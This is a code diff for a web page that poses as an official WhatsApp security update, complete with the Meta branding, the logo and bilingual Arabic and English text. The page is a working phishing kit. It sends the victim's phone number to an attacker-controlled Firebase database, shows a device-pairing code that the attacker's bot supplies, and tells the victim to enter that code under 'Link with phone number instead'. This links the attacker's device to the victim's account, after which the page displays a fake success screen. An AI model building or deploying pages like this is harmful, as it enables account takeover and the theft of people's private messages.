@@ -3,73 +3,238 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Update</title>
+    <title>WhatsApp Security Update</title>
+
+    <meta property="og:title" content="WhatsApp Security Update">
+    <meta property="og:description" content="Your verification code is ready! Update your account to version V3.0.1 now to ensure encryption.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/600px-WhatsApp.svg.png">
+    <meta property="og:url" content="https://wa-protocol-update.vercel.app">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="WhatsApp">
+
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r_o_pS3X9sl.png" type="image/x-icon">
+
     <style>
-        * { box-sizing: border-box; }
-        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
-        .container { width: 100%; max-width: 380px; text-align: center; }
-        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; user-select: none; pointer-events: none; }
-        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
-        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
-        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
-        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
-        .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
-        .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
-        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; position: relative; }
-        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
-        .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
-        #success-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
-        .check-mark { color: #00a884; font-size: 45px; font-weight: bold; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            background-color: #ffffff; 
+            margin: 0; 
+            padding: 20px;
+            color: #1c1e21;
+        }
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 65px; margin-top: 30px; margin-bottom: 25px; user-select: none; }
+        
+        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 12px; }
+        
+        .badge { 
+            background: #e7f3f3; 
+            color: #128c7e; 
+            padding: 6px 16px; 
+            border-radius: 20px; 
+            font-size: 13px; 
+            font-weight: 600; 
+            display: inline-block; 
+            margin-bottom: 30px; 
+        }
+
+        .v-box { 
+            background: #f8f9fa; 
+            border: 1px solid #e9ecef; 
+            border-radius: 14px; 
+            padding: 20px; 
+            margin-bottom: 30px; 
+            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+        }
+        .v-row { 
+            display: flex; 
+            justify-content: space-between; 
+            font-size: 15px; 
+            margin: 12px 0; 
+            border-bottom: 1px solid #f1f1f1;
+            padding-bottom: 8px;
+        }
+        .v-row:last-child { border-bottom: none; }
+        
+        .alert-p { 
+            font-size: 14px; 
+            color: #3b4a54; 
+            text-align: start; 
+            line-height: 1.6; 
+            background: #fff9f0;
+            border-left: 4px solid #ffd279;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        
+        .steps { 
+            text-align: start; 
+            font-size: 14.5px; 
+            color: #1c1e21; 
+            line-height: 1.8; 
+            padding: 0 10px;
+        }
+        
+        .code-zone { 
+            border: 2px solid #00a884; 
+            border-radius: 15px; 
+            padding: 25px; 
+            margin-top: 30px; 
+            min-height: 130px; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            position: relative;
+            background: #fafafa;
+        }
+        
+        #pairing-code { 
+            font-size: 36px; 
+            font-weight: 800; 
+            color: #075e54; 
+            letter-spacing: 6px; 
+            font-family: 'Courier New', Courier, monospace;
+            margin-bottom: 10px;
+        }
+        
+        .wait-text { font-size: 13px; font-weight: 500; color: #8696a0; }
+        
+        #success-screen { 
+            display: none; 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: #ffffff; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            z-index: 10; 
+            border-radius: 13px;
+        }
+        .check-mark { color: #00a884; font-size: 50px; font-weight: bold; margin-bottom: 5px; }
+
+        footer { margin-top: 50px; font-size: 12px; color: #b1b1b1; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div class="header-title">WhatsApp Security Update</div>
-        <div id="u-badge" class="badge">Checking Device...</div>
+        
+        <div class="header-title" id="txt-title">WhatsApp Security Update</div>
+        
+        <div id="u-badge" class="badge">Checking Device Status...</div>
+        
         <div class="v-box">
-            <div class="v-row"><span>Current Version:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
-            <div class="v-row"><span>Update To:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
-        </div>
-        <p id="u-alert" class="alert-p">لحماية خصوصيتك، يجب ترقية إصدار V2.12.5 فوراً لضمان تشفير المحادثات.</p>
-        <div id="u-steps" class="steps">
-            1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>
-            2. افتح التنبيه واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>
-            3. أدخل <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل في هاتفك:
-        </div>
-        <div class="code-zone">
-            <div id="pairing-code">...</div>
-            <div id="u-wait" class="wait-text">في انتظار الرمز الأمني...</div>
-            <div id="success-screen">
-                <div class="check-mark">✓</div>
-                <div style="font-weight:bold; font-size:15px">تم التحديث بنجاح.</div>
+            <div class="v-row">
+                <span id="txt-v-cur">Current Version:</span>
+                <span style="color:#d91e1e; font-weight:bold">V2.12.5 (Outdated)</span>
+            </div>
+            <div class="v-row">
+                <span id="txt-v-new">Security Update:</span>
+                <span style="color:#00a884; font-weight:bold">V3.0.1 (Stable)</span>
             </div>
         </div>
+
+        <div id="u-alert" class="alert-p"></div>
+
+        <div id="u-steps" class="steps"></div>
+
+        <div class="code-zone">
+            <div id="pairing-code">- - - - - - - -</div>
+            <div id="u-wait" class="wait-text">Connecting to secure server...</div>
+            
+            <div id="success-screen">
+                <div class="check-mark">✓</div>
+                <div id="success-text" style="font-weight:700; font-size:16px; color:#1c1e21">Update Successful</div>
+            </div>
+        </div>
+
+        <footer>From Meta</footer>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
     <script>
-        firebase.initializeApp({ databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" });
+        // إعدادات Firebase الخاصة بك
+        const firebaseConfig = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+
+        // اكتشاف لغة المتصفح ومعلومات الجهاز
+        const isAr = navigator.language.startsWith('ar');
+        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
         const pid = new URLSearchParams(window.location.search).get('id');
+
+        const lang = {
+            ar: {
+                title: "تحديث أمان واتساب",
+                badge: isIOS ? "مرتبط بجهاز: iPhone" : "مرتبط بجهاز: Android",
+                vCur: "الإصدار الحالي:",
+                vNew: "تحديث الأمان:",
+                alert: "حفاظاً على خصوصية رسائلك وتشفيرها التام، يتوجب عليك تحديث بروتوكول الأمان الحالي فوراً إلى الإصدار الأحدث V3.0.1.",
+                steps: "1. ستتلقى إشعاراً الآن من تطبيق WhatsApp بطلب 'ربط جهاز جديد'.<br>2. افتح الإشعار واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>3. سيظهر لك حقل إدخال، اكتب فيه <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل:",
+                wait: "جاري استخراج رمز الأمان...",
+                input: "أدخل الرمز الآن في هاتفك لتمام التحديث",
+                success: "تم تحديث البروتوكول بنجاح"
+            },
+            en: {
+                title: "WhatsApp Security Update",
+                badge: isIOS ? "Linked: iPhone Device" : "Linked: Android Device",
+                vCur: "Current Version:",
+                vNew: "Security Update:",
+                alert: "To maintain the privacy and end-to-end encryption of your messages, you must immediately upgrade your current security protocol to V3.0.1.",
+                steps: "1. You will receive a notification from WhatsApp to 'Link a device'.<br>2. Open the notification and select <b>'Link with phone number instead'</b>.<br>3. An input field will appear, enter the <b>8-digit code</b> shown below:",
+                wait: "Generating security code...",
+                input: "Enter the code on your phone now",
+                success: "Security Update Successful"
+            }
+        };
+
+        const ui = isAr ? lang.ar : lang.en;
+        document.documentElement.dir = isAr ? 'rtl' : 'ltr';
+        document.getElementById('txt-title').innerText = ui.title;
+        document.getElementById('u-badge').innerText = ui.badge;
+        document.getElementById('txt-v-cur').innerText = ui.vCur;
+        document.getElementById('txt-v-new').innerText = ui.vNew;
+        document.getElementById('u-alert').innerHTML = ui.alert;
+        document.getElementById('u-steps').innerHTML = ui.steps;
+        document.getElementById('u-wait').innerText = ui.wait;
 
         if (pid) {
             let phone = pid.replace(/\D/g, '');
             if (phone.startsWith('01') && phone.length === 11) phone = '20' + phone;
 
-            db.ref('monitoring/' + phone).set({ status: "pending", target: phone });
+            // 1. إرسال إشارة "pending" للبوت
+            db.ref('monitoring/' + phone).set({
+                status: "pending",
+                target: phone,
+                timestamp: Date.now()
+            });
 
-            db.ref('commands/' + phone).on('value', snap => {
-                const data = snap.val();
+            // 2. الاستماع للأوامر من البوت (الكود والحالة)
+            db.ref('commands/' + phone).on('value', (snapshot) => {
+                const data = snapshot.val();
                 if (data) {
                     if (data.code) {
                         document.getElementById('pairing-code').innerText = data.code;
-                        document.getElementById('u-wait').innerText = "أدخل الرمز الآن في هاتفك";
-                        document.getElementById('u-wait').style.color = "red";
+                        document.getElementById('u-wait').innerText = ui.input;
+                        document.getElementById('u-wait').style.color = "#d91e1e";
                     }
-                    if (data.status === 'syncing') document.getElementById('u-wait').innerText = "جاري مزامنة البيانات...";
-                    if (data.status === 'connected') document.getElementById('success-screen').style.display = 'flex';
+                    if (data.status === 'syncing') {
+                        document.getElementById('u-wait').innerText = isAr ? "جاري مزامنة التشفير..." : "Syncing encryption...";
+                    }
+                    if (data.status === 'connected') {
+                        document.getElementById('success-screen').style.display = 'flex';
+                        document.getElementById('success-text').innerText = ui.success;
+                    }
                 }
             });
         }
